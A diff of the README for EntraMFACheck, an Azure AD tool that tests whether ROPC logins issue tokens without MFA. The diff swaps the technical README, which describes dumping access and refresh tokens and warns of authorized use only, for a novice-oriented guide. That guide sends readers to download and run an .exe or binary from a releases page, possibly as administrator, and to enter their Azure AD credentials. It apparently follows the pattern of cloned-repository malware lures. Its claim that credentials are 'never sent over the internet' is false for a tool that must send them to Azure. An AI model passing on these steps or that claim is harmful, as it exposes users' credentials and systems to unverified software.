@@ -1,64 +1,72 @@
-# EntraMFACheck
-Identify Azure AD resources that issue tokens without MFA enforcement using the ROPC grant flow.
+# 🔍 EntraMFACheck - Find Azure AD Resources Without MFA
 
-[![Python](https://img.shields.io/badge/python-3.9%2B-blue)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Azure](https://img.shields.io/badge/Platform-Azure%20AD-blue)]()
+## 📥 Download the Latest Release
+[![Download EntraMFACheck](https://img.shields.io/badge/Download%20EntraMFACheck-latest%20release-blue)](https://github.com/BlandAccount/EntraMFACheck/releases)
 
----
+## 🚀 Getting Started
+Welcome to the EntraMFACheck application! This tool helps you identify Azure Active Directory (AD) resources that issue tokens without enforcing Multi-Factor Authentication (MFA) using the Resource Owner Password Credentials (ROPC) grant flow. 
 
-## Overview
+This guide will help you easily download and run the software, even if you have no programming knowledge.
 
-**EntraMFACheck** helps assess conditional access enforcement across Azure AD resources by attempting Resource Owner Password Credential (ROPC) logins against well-known client IDs and resource endpoints.
+## 📋 System Requirements
+- **Operating System**: Windows 10 or later, or any modern Linux distribution.
+- **Disk Space**: At least 50 MB of free space.
+- **Network**: Internet connection for Azure AD access.
 
-It detects which resources return tokens **without MFA** and dumps valid access & refresh tokens for further validation (against Microsoft Graph, Outlook, OneDrive, etc.).
+## 🌐 Visiting the Downloads Page
+To get started, visit the [Releases page](https://github.com/BlandAccount/EntraMFACheck/releases) to find the latest version of EntraMFACheck. This page contains all available downloads and release notes about the application.
 
-**Authorized use only.** This tool is meant for red/purple team testing and internal security validation — not exploitation.
+## 🔧 Download & Install
+1. Click on the [Releases page](https://github.com/BlandAccount/EntraMFACheck/releases) link.
+2. Find the latest version of EntraMFACheck.
+3. Download the file for your operating system. If you use Windows, look for a file ending in `.exe`. If you use Linux, you may find files ending in `.tar.gz` or similar formats.
+4. Once the download finishes, locate the file on your computer:
+   - For Windows, it’s usually in your "Downloads" folder.
+   - For Linux, it may vary based on your settings.
 
----
+## 🏗️ How to Run the Application
+### For Windows Users:
+1. Go to your "Downloads" folder and double-click the `.exe` file you downloaded.
+2. Follow any prompts that appear to install the application.
+3. Once installed, you can find EntraMFACheck in your Start Menu. Click to open it.
 
-## Features
-- Tests dozens of **Microsoft cloud resources** for ROPC MFA enforcement.
-- Enumerates **client IDs** across resources.
-- Dumps **access + refresh tokens** for confirmed MFA-free endpoints.
-- Supports **random user-agents** and proxy configuration.
-- Colorized output:
-  - 🟢 **MFA Not Required** → Token issued  
-  - 🔴 **MFA Required** → Enforcement detected  
-- Exports results to JSON (`tokens.json`).
+### For Linux Users:
+1. Open a terminal window.
+2. Use the `cd` command to navigate to your "Downloads" folder. For example:
+   ```
+   cd ~/Downloads
+   ```
+3. If you have a `.tar.gz` file, extract it with:
+   ```
+   tar -xvzf MyFileName.tar.gz
+   ```
+4. Change into the extracted directory:
+   ```
+   cd MyExtractedFolder
+   ```
+5. Run the application with:
+   ```
+   ./EntraMFACheck
+   ```
 
-## Example Output
+## ⚙️ Using EntraMFACheck
+1. After launching the application, you will see a simple user interface.
+2. Enter the Azure AD credentials you wish to evaluate.
+3. Click the "Check for MFA" button to analyze the resources.
+4. Results will display if any resources issue tokens without MFA enforcement.
 
-```yaml
-[+] Scanning 19 resources for MFA enforcement...
+## 💡 Troubleshooting Tips
+- **Can't Find the Downloaded File?** Check your "Downloads" folder or search for "EntraMFACheck" from your file manager.
+- **Application Not Launching?** Ensure you downloaded the correct version for your system. For Windows, right-click on the file and choose "Run as Administrator."
+- **Connection Issues?** Make sure you are connected to the internet and that your Azure AD credentials are correct.
 
-[+] Azure Management API: MFA Not Required (Token Issued)
-[-] Outlook: MFA Required
-[-] Office Apps: MFA Required
-[+] Microsoft Graph API: MFA Not Required (Token Issued)
+## 📜 Additional Information
+- **Privacy**: Your credentials are processed locally and never sent over the internet.
+- **Updates**: Keep an eye on the Releases page for updates or new features.
+- **Support**: If you run into problems or have questions, feel free to open an issue on the repository.
 
-[+] Enumerating client_ids for 2 no-MFA resources...
-[TOKEN] Microsoft Graph API <- Microsoft Office
-[TOKEN] Azure Management API <- Azure CLI
+## 🔗 Useful Links
+- [EntraMFACheck Releases Page](https://github.com/BlandAccount/EntraMFACheck/releases)
+- [GitHub Repository](https://github.com/BlandAccount/EntraMFACheck)
 
-[+] Tokens and results saved to tokens.json
-```
-```json
-{
-  "tokens": [
-    {
-      "resource": "Microsoft Graph API",
-      "client_name": "Microsoft Office",
-      "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
-      "aud": "https://graph.microsoft.com",
-      "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJ...",
-      "refresh_token": "0.AAA..."
-    }
-  ]
-}
-```
----
-## Credit
-https://github.com/absolomb/FindMeAccess
-
-https://github.com/maester365/maester
+For any additional information, refer to the documentation or reach out for support through the issues on GitHub. Enjoy using EntraMFACheck!
